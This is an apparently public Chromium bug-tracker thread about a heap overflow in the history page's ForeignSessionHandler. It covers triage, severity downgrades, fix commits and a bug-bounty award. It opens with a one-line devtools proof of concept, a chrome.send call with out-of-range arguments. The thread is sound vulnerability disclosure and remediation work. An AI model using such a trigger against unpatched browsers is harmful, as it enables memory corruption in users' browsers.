you can open the devtools and execute ```chrome.send("openForeignSession",["the_session_key_string","2000","-3000",4.4,true,true,true,true]);```

I guess that the_session_key_string maybe from the device name and use function to hash it.
So if someone know the hash, it maybe cause the browser out-of-bounds memory access.





### al...@google.com (2023-01-19)

Thanks. I will route this appropriately.

### al...@google.com (2023-01-19)

@bookholt It looks like this is in non-ChromeOS-specific code and might affect more than ChromeOS. On the flip side it might be ChromeOS-specific if the libc++ hardening flags would make it unreachable. WDYT?

[Monorail components: OS>Security]

### [Deleted User] (2023-01-19)

[Empty comment from Monorail migration]

### al...@google.com (2023-01-19)

[Empty comment from Monorail migration]

### [Deleted User] (2023-01-19)

Setting milestone and target because of high severity.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2023-01-19)

Setting Pri-1 to match security severity High. If this is incorrect, please reset the priority. Sheriffbot won't make this change again.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ma...@chromium.org (2023-01-19)

 allenwebb@ could you elaborate why I'd be a good owner for this? 

### al...@google.com (2023-01-19)

The affected function `void ForeignSessionHandler::OpenForeignSessionWindows` is covered by `chrome/browser/ui/webui/history/OWNERS` which points to `chrome/browser/resources/history/OWNERS` which lists:
mahmadi@chromium.org
manukh@chromium.org
tommycli@chromium.org

Are you aware of a better owner for this?

### ma...@chromium.org (2023-01-20)

technically we are the OWNERS but I don't think any of us have dealt with that code before. there is definitely an OWNERSHIP vacuum here. What is your assessment of the security severity of this? Should non-CrOS security owners also be consulted to see if this should even be fixed? adding tommycli@ and manukh@ in case they know more about this code.

### bo...@google.com (2023-01-20)

@mahmadi, sorry to ask, but we need your help to route this report to an appropriate owner. If OWNERS no longer reflects the state of play, it would be great if one outcome from this report is an update to OWNERS. 

The POC is on macOS and I'm not super familiar with our process model on Mac, but my reading of the stack trace is indicates this is memory corruption in the browser process. Reachability of memory corruption in the browser process from web content would warrant a Critical severity rating. However, per our severity guidelines I'm downgrading by 1 level to High due to the requirement for users to accurately perform multi-step maneuvers to reach the bug. If my reading of the stack trace is wrong, and this is a crash in a sandboxed process, then the severity should be further downgraded to Medium. 

CrOS is definitely impacted, but from the call tree of ForeignSessionHandler::RegisterMessage() [1] it seems to have broader impact across our supported OSs, so I'm adding our other supported platforms to be conservative. @owners, feel free to remove OSs if your investigation determines they are not impacted. 

[Monorail components: -OS>Security UI>Browser>History]

### bo...@google.com (2023-01-20)

Actually as I'm re-reading the repro instructions in https://crbug.com/chromium/1408120#c8 it's not obvious to me that exploitation can occur from web content, so I'm downgrading to Medium due to multiple mitigating factors. 

### [Deleted User] (2023-02-03)

mahmadi: Uh oh! This issue still open and hasn't been updated in the last 14 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ja...@chromium.org (2023-02-03)

[security marshal] pinging for an update. tommycli@ or manukh@, could you take a look? mahmadi@ asked for your input in https://crbug.com/chromium/1408120#c17.

It looks like we also need confirmation that other operating systems are impacted.

Thanks!

### ma...@chromium.org (2023-02-06)

Downgrading to Medium as per https://crbug.com/chromium/1408120#c19 

### ja...@chromium.org (2023-02-06)

Reassigning to tommycli to take a look.

### ja...@chromium.org (2023-02-06)

[security marshal] Hi tommycli@ could you take a look at this issue? From c17 it sounds like you could have more context.

### [Deleted User] (2023-02-07)

[Empty comment from Monorail migration]

### gi...@appspot.gserviceaccount.com (2023-02-07)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src/+/70617a38826204c03c804971af0f3098f78f47a8

commit 70617a38826204c03c804971af0f3098f78f47a8
Author: Tommy C. Li <tommycli@chromium.org>
Date: Tue Feb 07 22:16:05 2023

[history] Fix unchecked chrome.send param in ForeignSessionHandler

The bug describes that a heap overflow can be triggered by using
chrome.send to send an invalid message to the C++ handler.

That was true because the C++ handler did not check the bounds of the
array before using the parameter.

This code is essentially unowned, but I'm fixing it because I'm listed
as a History owner.

Bug: 1408120
Change-Id: Ia8f049ca8bc35bbe63122affcb24b83d7d9cdb62
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/4226314
Code-Coverage: Findit <findit-for-me@appspot.gserviceaccount.com>
Reviewed-by: Demetrios Papadopoulos <dpapad@chromium.org>
Commit-Queue: Demetrios Papadopoulos <dpapad@chromium.org>
Auto-Submit: Tommy Li <tommycli@chromium.org>
Cr-Commit-Position: refs/heads/main@{#1102408}

[modify] https://crrev.com/70617a38826204c03c804971af0f3098f78f47a8/chrome/browser/ui/webui/history/foreign_session_handler.h
[modify] https://crrev.com/70617a38826204c03c804971af0f3098f78f47a8/chrome/browser/ui/webui/history/foreign_session_handler.cc


### [Deleted User] (2023-02-08)

[Empty comment from Monorail migration]

### wx...@gmail.com (2023-02-13)

I think we can set the status to fixed.

### [Deleted User] (2023-02-17)

tommycli: Uh oh! This issue still open and hasn't been updated in the last 31 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2023-02-27)

This issue hasn't been updated in the last 30 days - please update it or consider lowering its priority.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2023-03-09)

This issue hasn't been updated in the last 30 days - please update it or consider lowering its priority.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2023-03-20)

This issue hasn't been updated in the last 30 days - please update it or consider lowering its priority.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2023-03-30)

This issue hasn't been updated in the last 30 days - please update it or consider lowering its priority.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### am...@chromium.org (2023-03-31)

this appears to be resolved based on the CL in https://crbug.com/chromium/1408120#c26

### am...@chromium.org (2023-03-31)

[Empty comment from Monorail migration]

### [Deleted User] (2023-04-01)

[Empty comment from Monorail migration]

### [Deleted User] (2023-04-01)

[Empty comment from Monorail migration]

### pg...@google.com (2023-04-04)

[Empty comment from Monorail migration]

### pg...@google.com (2023-04-04)

[Empty comment from Monorail migration]

### am...@google.com (2023-04-13)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.
******************************

### am...@chromium.org (2023-04-13)

Congratulations, Raven! The VRP Panel has decided to award you $3,000 for this report of a moderately mitigated security bug. Thank you for your efforts and reporting this issue to us! 

### am...@google.com (2023-04-14)

[Empty comment from Monorail migration]

### gi...@appspot.gserviceaccount.com (2023-05-19)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src/+/8449e3cc217ed4b7fa95be8cb20508e367aba71d

commit 8449e3cc217ed4b7fa95be8cb20508e367aba71d
Author: Tommy C. Li <tommycli@chromium.org>
Date: Fri May 19 22:50:50 2023

[history] Fix regression in Open All for History Tabs from Other Devices

In this CL, I fix a security issue, but caused a functionality
regression:
https://chromium-review.googlesource.com/c/chromium/src/+/4226314

This CL keeps the security fix, but restores the functionality.

It turns out the `window_num` argument wasn't used at all anyways.

When opening a single tab: It was ignored.
When opening all tabs: The argument never existed, so it was always -1.

This CL just deletes the argument everywhere, and also fixes the
functionality.

I manually tested it.

Bug: 1418862, 1408120
Change-Id: I778da7aa311881b340bceb2bf7ae20ab7692ba15
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/4544909
Reviewed-by: Demetrios Papadopoulos <dpapad@chromium.org>
Commit-Queue: Tommy Li <tommycli@chromium.org>
Cr-Commit-Position: refs/heads/main@{#1146757}

[modify] https://crrev.com/8449e3cc217ed4b7fa95be8cb20508e367aba71d/chrome/browser/ui/webui/history/foreign_session_handler_unittest.cc
[modify] https://crrev.com/8449e3cc217ed4b7fa95be8cb20508e367aba71d/chrome/browser/ui/webui/history/foreign_session_handler.h
[modify] https://crrev.com/8449e3cc217ed4b7fa95be8cb20508e367aba71d/chrome/test/data/webui/history/test_browser_service.ts
[modify] https://crrev.com/8449e3cc217ed4b7fa95be8cb20508e367aba71d/chrome/test/data/webui/history/history_synced_tabs_test.ts
[modify] https://crrev.com/8449e3cc217ed4b7fa95be8cb20508e367aba71d/chrome/browser/resources/history/browser_service.ts
[modify] https://crrev.com/8449e3cc217ed4b7fa95be8cb20508e367aba71d/chrome/browser/resources/history/synced_device_card.ts
[modify] https://crrev.com/8449e3cc217ed4b7fa95be8cb20508e367aba71d/chrome/browser/ui/webui/history/foreign_session_handler.cc


### gi...@appspot.gserviceaccount.com (2023-06-08)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src/+/b686d55d5cc63581727f6c7c838ee9521e2c8f16

commit b686d55d5cc63581727f6c7c838ee9521e2c8f16
Author: Tommy C. Li <tommycli@chromium.org>
Date: Thu Jun 08 00:26:47 2023

[M-114][history] Fix regression in Open All for History Tabs from Other Devices

In this CL, I fix a security issue, but caused a functionality
regression:
https://chromium-review.googlesource.com/c/chromium/src/+/4226314

This CL keeps the security fix, but restores the functionality.

It turns out the `window_num` argument wasn't used at all anyways.

When opening a single tab: It was ignored.
When opening all tabs: The argument never existed, so it was always -1.

This CL just deletes the argument everywhere, and also fixes the
functionality.

I manually tested it.

(cherry picked from commit 8449e3cc217ed4b7fa95be8cb20508e367aba71d)

Bug: 1418862, 1408120
Change-Id: I778da7aa311881b340bceb2bf7ae20ab7692ba15
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/4544909
Reviewed-by: Demetrios Papadopoulos <dpapad@chromium.org>
Commit-Queue: Tommy Li <tommycli@chromium.org>
Cr-Original-Commit-Position: refs/heads/main@{#1146757}
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/4598531
Commit-Queue: Sophie Chang <sophiechang@chromium.org>
Cr-Commit-Position: refs/branch-heads/5735@{#1196}
Cr-Branched-From: 2f562e4ddbaf79a3f3cb338b4d1bd4398d49eb67-refs/heads/main@{#1135570}

[modify] https://crrev.com/b686d55d5cc63581727f6c7c838ee9521e2c8f16/chrome/browser/ui/webui/history/foreign_session_handler_unittest.cc
[modify] https://crrev.com/b686d55d5cc63581727f6c7c838ee9521e2c8f16/chrome/browser/ui/webui/history/foreign_session_handler.h
[modify] https://crrev.com/b686d55d5cc63581727f6c7c838ee9521e2c8f16/chrome/browser/resources/history/browser_service.ts
[modify] https://crrev.com/b686d55d5cc63581727f6c7c838ee9521e2c8f16/chrome/test/data/webui/history/history_synced_tabs_test.ts
[modify] https://crrev.com/b686d55d5cc63581727f6c7c838ee9521e2c8f16/chrome/test/data/webui/history/test_browser_service.ts
[modify] https://crrev.com/b686d55d5cc63581727f6c7c838ee9521e2c8f16/chrome/browser/resources/history/synced_device_card.ts
[modify] https://crrev.com/b686d55d5cc63581727f6c7c838ee9521e2c8f16/chrome/browser/ui/webui/history/foreign_session_handler.cc


### [Deleted User] (2023-07-08)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### is...@google.com (2024-01-09)

This issue was migrated from crbug.com/chromium/1408120?no_tracker_redirect=1

[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40062710)*
